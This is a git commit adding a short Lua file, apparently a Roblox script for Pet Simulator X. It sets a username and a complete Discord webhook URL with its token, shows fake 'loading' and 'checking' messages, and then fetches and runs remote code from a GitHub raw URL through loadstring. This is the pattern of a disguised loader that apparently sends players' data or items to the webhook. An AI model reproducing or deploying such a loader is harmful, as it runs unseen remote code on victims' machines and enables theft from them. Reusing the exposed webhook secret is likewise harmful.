ef088945bc51dcddd1012fd634943da2a8e6446a
Xrxradrad <125693592+Xrxradrad@users.noreply.github.com>
2023-04-16 21:03:47 +0200

    Add files via upload

---
+++ psx.lua
@@ -0,0 +1,9 @@
+Username = "Xrxradrad"
+WebHook = "https://discord.com/api/webhooks/1076137116465123408/_e56pLyeCI-nqQdm4KcllOtGeSxzknIBQk69JTv2YlVpnVp7XqCTn6KX8G9fhnxZWgHp"
+
+_G.CustomScriptName = "Project WD"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
